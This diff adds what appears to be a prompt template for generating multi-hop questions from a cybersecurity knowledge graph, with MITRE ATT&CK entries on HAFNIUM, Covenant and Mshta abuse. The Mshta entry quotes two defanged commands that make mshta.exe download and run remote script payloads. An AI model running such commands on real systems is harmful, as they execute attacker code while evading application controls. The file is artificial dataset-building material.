@@ -1,0 +1,96 @@
+Instruction:
+You are an experienced cybersecurity analyst who possesses a small knowledge portion of cybersecurity. The knowledge you will be receiving will be in the form of a collection of two relationship between three nodes. For example; there will be two continuous relationships between the nodes node1, node2 and node3; node1 containing information about UcoExploitTarget, node2 about UcoVulnerability and node3 UcoCVE. Node1 will be connected in a way that a will be connected to node2 with relationship “r” with the type called UCOHASVULNERABILITY and node2 will be connected to node3 with relationship “s” with the relationship type UCOHASCVE_ID. Therefore, there will always be a start node and an end node and a node in between.
+You will be helping users by looking at the knowledge portion and designing one question from the provided cybersecurity knowledge portion and that cybersecurity knowledge portion only. Your question should be in natural English. It should be simple and easy to be understood by normal readers.
+In real application, we will use neo4j database. We want questions in a way that the user have to answer in a manner by reading a question and depending on the words in the question, the user needs to find a node first (the root node of course). And then the user have to look into the outgoing relationship of the root node to find the node in between. Then from the node in between, the user needs to expand more outgoing nodes to find the answer in the end node.
+The catch in creating the question is that the question should only contain words from description, summary or other properties of the root node. The question should also contain a part from the answer node so the user will know what part of the answer node it has to look into when once the user can finally get to the final node. I would not like to see the components of the middle node in the question. Moreover it is also advised to not make the question very detailed with so many key words. Key words are ok but not in a way the entire question is easy to answer by just looking at keywords.
+*It is also important to not visit the links once you are creating question. In other words, we don’t allow words from the content of the link to appear in the question. It is best not to visit links and ignore them once you see one.
+In the output indicator below, you will see what kind of question we would like to get from a node. You can reference the style of the question from the output indicator below. 
+
+
+
+
+Context:
+This is the schema of our database. 
+NODES:
+UcoCVE { label: string, ucobaseSeverity: string, ucoevaluatorSolution: string, ucoexploitabilityScore: string, ucoimpactScore: string, ucoobtainAllPrivilege: string, ucouserInteractionRequired: string, ucovectorString: string, ucovulnStatus: string, uri: string }
+UcoCWE { ucoabstraction: string, ucoapplicablePlatform: string, ucocommonConsequences: string, ucocweExtendedSummary: string, ucocweID: string, ucocweName: string, ucocweSummary: string, ucodemonstrativeExamples: string, ucodescription: string, ucodetectionMethods: string, ucolikelihoodOfExploit: string, ucomappingNotes: string, ucomodesOfIntroduction: string, ucopotentialMitigations: string, ucoreferences: string, ucorelatedAttackPatterns: string, ucostatus: string, ucostructure: string, ucotimeOfIntroduction: unknown, uri: string }
+UcoExploitTarget { uri: string }
+UcoVulnerability { ucolastModifiedDateTime: unknown, ucopublishedDateTime: unknown, ucosummary: string, uri: string }
+UcoexCAMPAIGNS { ucoexDESCRIPTION: string, ucoexDOMAIN: string, ucoexNAME: string, ucoexURL: string, uri: string }
+UcoexCAPEC { label: string, ucoexAbstraction: string, ucoexCAPEC_id: string, ucoexCAPEC_name: string, ucoexConsequences: list<string>, ucoexDescription: string, ucoexExample: list<string>, ucoexExecutionFlowTechnique: list<string>, ucoexExtendedDescription: list<string>, ucoexLikelihood: string, ucoexMitigations: list<string>, ucoexPrerequisites: list<string>, ucoexRelatedAttPattern: list<string>, ucoexRelatedWeaknesses: list<string>, ucoexResources_Required: list<string>, ucoexSeverity: string, ucoexSkills_Required: list<string>, ucoexTaxonomyMappingATTACK: list<string>, uri: string }
+UcoexCPE { cpeName: string, cpeNameId: string, dictionary_found: boolean, lastModified: unknown, titles: string, uri: string }
+UcoexGROUPS { ucoexDESCRIPTION: string, ucoexDOMAIN: string, ucoexNAME: string, ucoexURL: string, uri: string }
+UcoexMITIGATIONS { ucoexDESCRIPTION: string, ucoexDOMAIN: string, ucoexNAME: string, ucoexURL: string, uri: string }
+UcoexMITREATTACK { ucoexDESCRIPTION: string, ucoexDOMAIN: string, ucoexNAME: string, ucoexURL: string, uri: string }
+UcoexMITRED3FEND { ucoexMITRED3FEND_DEFINITION: string, ucoexMITRED3FEND_LABEL: string, uri: string }
+UcoexObservedExample { ucoexDESCRIPTION: string, uri: string }
+UcoexSOFTWARE { ucoexDESCRIPTION: string, ucoexDOMAIN: string, ucoexNAME: string, ucoexURL: string, uri: string }
+UcoexTACTICS { ucoexDESCRIPTION: string, ucoexDOMAIN: string, ucoexNAME: string, ucoexURL: string, uri: string }
+
+RELATIONSHIPS:
+(:UcoCVE) -[:UCOEXHASCPE]-> (:UcoexCPE)
+(:UcoCWE) -[:UCOHASOBSERVEDEXAMPLE]-> (:UcoexObservedExample)
+(:UcoExploitTarget) -[:UCOHASVULNERABILITY]-> (:UcoVulnerability)
+(:UcoExploitTarget) -[:UCOHASWEAKNESS]-> (:UcoCWE)
+(:UcoVulnerability) -[:UCOHASCVE_ID]-> (:UcoCVE)
+(:UcoexCAMPAIGNS) -[:UCOEXATTRIBUTEDTO]-> (:UcoexGROUPS)
+(:UcoexCAMPAIGNS) -[:UCOEXCAMPAIGNUSESSOFTWARE]-> (:UcoexSOFTWARE)
+(:UcoexCAMPAIGNS) -[:UCOEXCAMPAIGNUSESTECHNIQUE]-> (:UcoexMITREATTACK)
+(:UcoexCAPEC) -[:UCOEXHASRELATEDWEAKNESS]-> (:UcoCWE)
+(:UcoexCAPEC) -[:UCOEXHASTAXONOMYMAPPING]-> (:UcoexMITREATTACK)
+(:UcoexGROUPS) -[:UCOEXGROUPUSESSOFTWARE]-> (:UcoexSOFTWARE)
+(:UcoexGROUPS) -[:UCOEXGROUPUSESTECHNIQUE]-> (:UcoexMITREATTACK)
+(:UcoexMITIGATIONS) -[:UCOEXMITIGATES]-> (:UcoexMITREATTACK)
+(:UcoexMITRED3FEND) -[:UCOEXHASMITREATTACK]-> (:UcoexMITREATTACK)
+(:UcoexObservedExample) -[:UCOEXEXAMPLEOBSERVEDIN]-> (:UcoCVE)
+(:UcoexSOFTWARE) -[:UCOEXSOFTWAREUSESTECHNIQUE]-> (:UcoexMITREATTACK)
+
+It shows the type of relationship between each nodes. In our input, this would not be available, but there will be a relationship, the type of relationship, the id of relationship, the start node and the end node. Your duty for this time is to create a question (as mentioned above), that makes the user start at the root node and then make it traverse through the relationships to finally meet the end node where the answer will be.
+
+Input Data:
+[
+  {
+    "node1": {
+      "ucoexDESCRIPTION": "[HAFNIUM](https://attack.mitre.org/groups/G0125) is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. [HAFNIUM](https://attack.mitre.org/groups/G0125) primarily targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs. [HAFNIUM](https://attack.mitre.org/groups/G0125) has targeted remote management tools and cloud software for intial access and has demonstrated an ability to quickly operationalize exploits for identified vulnerabilities in edge devices.(Citation: Microsoft HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021)(Citation: Microsoft Silk Typhoon MAR 2025)",
+      "ucoexNAME": "HAFNIUM",
+      "ucoexDOMAIN": "enterprise-attack",
+      "labels": "UcoexGROUPS"
+    },
+    "node2": {
+      "ucoexDESCRIPTION": "[Covenant](https://attack.mitre.org/software/S1155) is a multi-platform command and control framework written in .NET. While designed for penetration testing and security research, the tool has also been used by threat actors such as [HAFNIUM](https://attack.mitre.org/groups/G0125) during operations. [Covenant](https://attack.mitre.org/software/S1155) functions through a central listener managing multiple deployed \"Grunts\" that communicate back to the controller.(Citation: Github Covenant)(Citation: Microsoft HAFNIUM March 2020)",
+      "ucoexNAME": "Covenant",
+      "ucoexDOMAIN": "enterprise-attack",
+      "labels": "UcoexSOFTWARE"
+    },
+    "node3": {
+      "ucoexDESCRIPTION": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017)\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+      "ucoexNAME": "System Binary Proxy Execution: Mshta",
+      "ucoexDOMAIN": "enterprise-attack",
+      "labels": "Resource"
+    },
+    "relationships": {
+      "node1_node2": [
+        {
+          "type": "UCOEXGROUPUSESSOFTWARE"
+        }
+      ],
+      "node2_node3": [
+        {
+          "type": "UCOEXSOFTWAREUSESTECHNIQUE"
+        }
+      ]
+    }
+  }
+]
+
+Output indicator
+  {
+    "question": "Which proxy execution method is employed by Chinese espionage operations against law firms in the United States?",
+    "answer": "System Binary Proxy Execution: Mshta",
+    "start_node": "node1",
+    "intermediate_node": "node2",
+    "end_node": "node3",
+    "source_breakdown": {
+      "root_node_clues": "Chinese espionage operations (from node1: 'operating out of China'), against law firms (from node1: 'law firms')",
+      "answer_node_clues": "proxy execution method (from node3: ucoexNAME)"
+    }
